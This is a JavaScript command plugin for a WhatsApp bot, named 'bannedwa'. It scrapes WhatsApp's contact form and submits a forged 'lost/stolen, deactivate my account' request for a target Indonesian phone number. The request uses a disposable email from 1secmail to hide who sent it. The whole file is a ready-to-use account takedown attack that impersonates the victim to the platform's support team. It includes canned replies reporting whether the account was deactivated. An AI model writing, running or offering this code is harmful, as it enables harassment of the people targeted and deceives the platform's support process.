let axios = require("axios")
let cheerio = require("cheerio")
let PhoneNumber = require("awesome-phonenumber")

let handler = async (m, { conn, text }) => {
	if (!text) {
		return m.reply("*Example*: .bannedwa +6285xxxxxxxxx");
	}
    
	conn.sendMessage(m.chat, {
		react: {
			text: '🗿',
			key: m.key,
		}
	})

	text = text.replace(/[^0-9]/g, "");
	if (!(text.startsWith("08") || text.startsWith("62"))) {
		return m.reply("Bot can only handle Indonesian numbers.");
	}

	text = text.startsWith("08") ? text.replace("08", "62") : text;
	if (text + "@s.whatsapp.net" === conn.user.jid) {
		return m.reply("Looks like you entered the Bot number.");
	}

	const isValid = await conn.onWhatsApp(text + "@s.whatsapp.net");
	if (isValid.length == 0) {
		return m.reply("The number you input is not registered on Whatsapp, please try again.");
	}

	text = text.trim();

	try {
		const data = await axios.get("https://www.whatsapp.com/contact/noclient/");
		const email = await axios.get(
			"https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10"
		);
		const cookie = data.headers["set-cookie"] || ""
		const $ = cheerio.load(data.data);
		const $form = $("form");
		const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
		let form = new URLSearchParams();
		form.append("jazoest", $form.find("input[name=jazoest]").val());
		form.append("lsd", $form.find("input[name=lsd]").val());
		form.append("step", "submit");
		form.append("country_selector", "INDONESIA");

		text = PhoneNumber("+" + text).getNumber("international");
		form.append("phone_number", `${text}`);
		form.append("email", email.data[0]);
		form.append("email_confirm", email.data[0]);
		form.append("platform", "ANDROID");
		form.append("your_message", "Perdido/roubado: desative minha conta");
		form.append("__user", "0");
		form.append("__a", "1");
		form.append("__csr", "");
		form.append("__req", "8");
		form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
		form.append("dpr", "1");
		form.append("__ccg", "UNKNOWN");
		form.append("__rev", "1006630858");
		form.append("__comment_req", "0");

		const res = await axios({
			url,
			method: "POST",
			data: form,
			headers: {
				cookie,
			},
		});
		const payload = String(res.data);

		if (payload.includes(`"payload":true`)) {
			m.reply(
				`WhatsApp Support
Hi,
Thank you for your message.
We have deactivated your WhatsApp account.`.trim()
			);
		} else if (payload.includes(`"payload":false`)) {
			m.reply(
				`Thank you for contacting us.
We ll get back to you via email, and it may take up to three business days.`.trim()
			);
		} else m.reply(await import("utils").format(res.data));
	} catch (err) {
		m.reply(`${err}`);
	}
};

handler.help = ['bannedwa']
handler.tags = ['owner']
handler.command = /^(bannedwa)$/i
handler.owner = true
handler.premium = true

module.exports = handler